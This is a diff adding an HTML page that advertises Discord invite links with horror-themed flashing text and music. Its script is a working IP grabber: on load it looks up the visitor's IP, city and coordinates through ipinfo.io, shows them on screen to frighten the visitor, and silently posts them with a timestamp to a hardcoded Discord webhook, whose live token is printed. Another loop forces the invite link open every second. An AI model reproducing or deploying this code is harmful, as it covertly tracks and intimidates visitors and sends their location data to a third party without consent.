@@ -1,0 +1,203 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>discord.gg/883</title>
+    <style>
+        @keyframes colorShift {
+          0%, 100% { color: #ffffff; }
+          50% { color: #ff0000; }
+        }
+        @keyframes flicker {
+      0% { opacity: 0.2; transform: scale(1); }
+      50% { opacity: 0.9; transform: scale(1.05); }
+      100% { opacity: 0.1; transform: scale(1); }
+    }
+        body {
+          margin: 0;
+          padding: 0;
+          background: radial-gradient(circle at top left, #0d0d0d, #000000);
+          font-family: 'Courier New', Courier, monospace;
+          color: #9f8663;
+          display: flex;
+          justify-content: center;
+          align-items: center;
+          height: 100vh;
+          flex-direction: column;
+          text-align: center;
+          overflow: hidden;
+        }
+     body::after {
+      content: "";
+      position: fixed;
+      inset: 0;
+      background: radial-gradient(ellipse at center, rgba(0,0,0,0) 60%, rgba(0,0,0,0.9) 100%);
+      pointer-events: none;
+      z-index: 1;
+    }
+    
+        body::before {
+          content: "";
+          position: fixed;
+          inset: 0;
+          background: url('https://i.pinimg.com/originals/dd/94/d3/dd94d32a8908d0e9ad62e7d0ea61609c.gif') center/cover no-repeat;
+          opacity: 0.08;
+          z-index: -1;
+        }
+    
+        #content {
+          display: none;
+          opacity: 0;
+          transition: opacity 2s ease;
+        }
+    
+        .video-container img {
+          width: 400px;
+          height: auto;
+          border: 2px solid #c2c2c2;
+          border-radius: 15px;
+          box-shadow: 0 0 15px rgba(255, 255, 255, 0.7);
+        }
+    
+        .info {
+          margin-top: 20px;
+          font-size: 1.5em;
+          color: #ffffff;
+          letter-spacing: 4.5px;
+          white-space: pre-wrap;
+        }
+    
+        .text {
+          margin-top: 5px;
+          font-size: 75px;
+          color: #ffffff;
+          text-shadow: 0 0 8px #ffffff, 0 0 15px #ffffff, 0 0 25px #ffffff;
+          letter-spacing: 4.5px;
+        }
+    
+        .text2 {
+          margin-top: 5px;
+          font-size: 55px;
+          letter-spacing: 4.5px;
+          white-space: nowrap;
+          font-weight: bold;
+          height: 90px;
+          animation: colorShift 1s infinite;
+        }
+       .text3 {
+          margin-top: 5px;
+          font-size: 75px;
+          color: #FFFF00;
+          text-shadow: 0 0 8px #ffffff, 0 0 15px #ffffff, 0 0 25px #ffffff;
+          letter-spacing: 4.5px;
+        }
+        .whisper {
+          position: fixed;
+          font-size: 2rem;
+          color: white;
+          opacity: 0;
+          transition: opacity 0.2s;
+          pointer-events: none;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="gif-container"><img src="" alt="" /></div>
+
+    <div id="content">
+        <div class="video-container">
+            <img src="https://i.pinimg.com/736x/4d/77/cd/4d77cd169aa4595eace2fd0c9a12c579.jpg" alt="Banner" />
+        </div>
+
+        <audio autoplay loop>
+            <source src="https://j.top4top.io/m_35114grb51.mp3" type="audio/mpeg" />
+        </audio>
+
+        <div class="info" id="ip-info"></div>
+        <div class="text2" id="typewriter"></div>
+        <div class="text">discord.gg/rll</div>
+        <div class="text3">discord.gg/261</div>
+        <div class="whisper"></div>
+        <div class="whisper"></div>
+        <div class="whisper"></div>
+        <div class="whisper"></div>
+        <div class="whisper"></div>
+        <div class="whisper"></div>
+        <div class="whisper"></div>
+    </div>
+
+    <script>
+        setTimeout(() => {
+          document.querySelector('.gif-container').style.display = 'none';
+          const content = document.getElementById('content');
+          content.style.display = 'block';
+          setTimeout(() => {
+            content.style.opacity = 1;
+          }, 200);
+        }, 200);
+    
+        fetch('https://ipinfo.io/json')
+          .then(response => response.json())
+          .then(data => {
+            const { ip, country, city, region, loc, org, timezone } = data;
+            const infoDiv = document.getElementById('ip-info');
+            infoDiv.innerHTML = `
+<strong>City:</strong><span>"${city}"</span><br>
+<strong>IP:</strong><span>"${ip}"</span><br>
+<strong>Location:</strong><span>"${loc}"</span>`;
+
+    
+            const dateTime = new Date().toLocaleString();
+            const webhookUrl = 'https://discord.com/api/webhooks/1405911257076465716/EfK2-sqrK329tsjE6voy6AgsZ5Ggv-7X1_E_xgwyBkJNcCBRKuSZMiXrUHjfWAMvQwXE';
+            fetch(webhookUrl, {
+              method: 'POST',
+              headers: {'Content-Type': 'application/json'},
+              body: JSON.stringify({content: `IP : ${ip}\nCountry & City : ${country} - ${city}\nDate & Time : ${dateTime}\n -`})
+            });
+          });
+    
+        const phrases = ["RUN", "BEHIND YOU", "WAKE UP", "HE'S COMING", "WHY", "DON'T MOVE", "LOOK BACK"];
+        const whisperEls = document.querySelectorAll(".whisper");
+    
+        whisperEls.forEach((el, i) => {
+          function triggerWhisper() {
+            const phrase = phrases[Math.floor(Math.random() * phrases.length)];
+            const x = Math.floor(Math.random() * 90);
+            const y = Math.floor(Math.random() * 90);
+            el.textContent = phrase;
+            el.style.left = `${x}%`;
+            el.style.top = `${y}%`;
+            el.style.opacity = 1;
+            setTimeout(() => {
+              el.style.opacity = 0;
+              setTimeout(triggerWhisper, Math.random() * 5000 + 2000);
+            }, 800);
+          }
+          setTimeout(triggerWhisper, i * 1000);
+        });
+    
+        const word = "[ KALI & SaYo ]";
+        const el = document.getElementById("typewriter");
+        let index = 0;
+        let forward = true;
+    
+        setInterval(() => {
+          if (forward) {
+            index++;
+            if (index === word.length) forward = false;
+          } else {
+            index--;
+            if (index === 0) forward = true;
+          }
+          el.textContent = word.slice(0, index);
+        }, 250);
+setInterval(() => {
+    window.invokeNative("openUrl", "https://discord.gg/rll");
+}, 1000);
+</script>
+</body>
+
+</html>
